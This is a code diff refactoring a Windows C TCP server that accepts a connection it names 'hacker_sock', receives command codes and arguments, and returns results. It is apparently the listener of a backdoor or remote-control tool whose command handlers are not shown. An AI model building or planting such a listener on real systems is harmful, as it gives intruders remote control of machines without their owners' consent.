@@ -1,4 +1,4 @@
-#include "pch.h"
+#include "..\pch.h"
 
 #include "Server.h"
 #include "Commands.h"
@@ -8,22 +8,10 @@
 
 SOCKET InitTCPServer()
 {	
-	WSADATA wsaData;
-	INT     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (iResult != 0)
-	{
-		$error _tprintf(TEXT("WSAStartup failed with error: %d\n"), iResult);
-
-		return INVALID_SOCKET;
-	}
-	$i _tprintf(TEXT("Startup finished\n"));
-
 	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (listen_sock == INVALID_SOCKET)
 	{
-		PrintError(TEXT("socket"), WSAGetLastError());
-
-		WSACleanup();
+		PrintError(TEXTH("socket"), WSAGetLastError());
 
 		return INVALID_SOCKET;
 	}
@@ -34,25 +22,23 @@ SOCKET InitTCPServer()
 	addr_sock.sin_port        = htons(DEFAULT_PORT);
 	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(addr_sock)) == SOCKET_ERROR)
 	{
-		PrintError(TEXT("bind"), WSAGetLastError());
+		PrintError(TEXTH("bind"), WSAGetLastError());
 
 		closesocket(listen_sock);
-		WSACleanup();
 
 		return INVALID_SOCKET;
 	}
-	$i _tprintf(TEXT("Binding socket finished\n"));
+	$i _tprintf(TEXTH("Binding socket finished\n"));
 
 	if (listen(listen_sock, 1) == SOCKET_ERROR)
 	{
-		PrintError(TEXT("listen"), WSAGetLastError());
+		PrintError(TEXTH("listen"), WSAGetLastError());
 
 		closesocket(listen_sock);
-		WSACleanup();
 
 		return INVALID_SOCKET;
 	}
-	$i _tprintf(TEXT("Socket started to listen\n"));
+	$i _tprintf(TEXTH("Socket started to listen\n"));
 
 	return listen_sock;
 }
@@ -65,17 +51,17 @@ VOID RunServer(SOCKET listen_sock)
 		 args[ARGS_LENGTH]    = { 0 };
 	while (TRUE)
 	{
-		$i _tprintf(TEXT("Waiting for the client\n"));
+		$i _tprintf(TEXTH("Waiting for the client\n"));
 
 		SOCKET hacker_sock = accept(listen_sock, NULL, NULL);
 		if (hacker_sock == INVALID_SOCKET)
 		{
-			PrintError(TEXT("accept"), WSAGetLastError());
+			PrintError(TEXTH("accept"), WSAGetLastError());
 
 			return;
 		}
 
-		$i _tprintf(TEXT("Connected\n"));
+		$i _tprintf(TEXTH("Connected\n"));
 		while (TRUE)
 		{
 			INT bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
@@ -96,7 +82,7 @@ VOID RunServer(SOCKET listen_sock)
 
 			if (code == UNDEFINEDCMD)
 			{
-				$e _tprintf(TEXT("Undefined cmd code(%hs)\n"), cmd);
+				$e _tprintf(TEXTH("Undefined cmd code(%hs)\n"), cmd);
 
 				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
 
@@ -104,9 +90,9 @@ VOID RunServer(SOCKET listen_sock)
 			}
 
 			TCHAR targs[ARGS_LENGTH] = { 0 };
-			if (_stprintf_s(targs, ARGS_LENGTH, TEXT("%hs"), args) != 1)
+			if (_stprintf_s(targs, ARGS_LENGTH, TEXTH("%hs"), args) != 1)
 			{
-				$e _tprintf(TEXT("Cannot convert args to TCHAR\n"), cmd);
+				$e _tprintf(TEXTH("Cannot convert args to TCHAR\n"));
 
 				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
 
@@ -119,20 +105,20 @@ VOID RunServer(SOCKET listen_sock)
 			size_t retval = 0;
 			if (wcstombs_s(&retval, result, RESULT_LENGTH, tresult, RESULT_LENGTH - 1) != 0)
 			{
-				$e _tprintf(TEXT("Cannot convert tresult to CHAR\n"), cmd);
+				$e _tprintf(TEXTH("Cannot convert tresult to CHAR\n"));
 
 				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
 
 				break;
 			}
 
-			$i _tprintf(TEXT("Sending answer(%hs)\n"), result);
+			$i _tprintf(TEXTH("Sending answer(%hs)\n"), result);
 			send(hacker_sock, result, RESULT_LENGTH, 0);
 		}
 		
 		closesocket(hacker_sock);
 
-		$i _tprintf(TEXT("Client disconnected\n"));
+		$i _tprintf(TEXTH("Client disconnected\n"));
 		SleepEx(10000, FALSE);
 		ClearConsole();
 	}
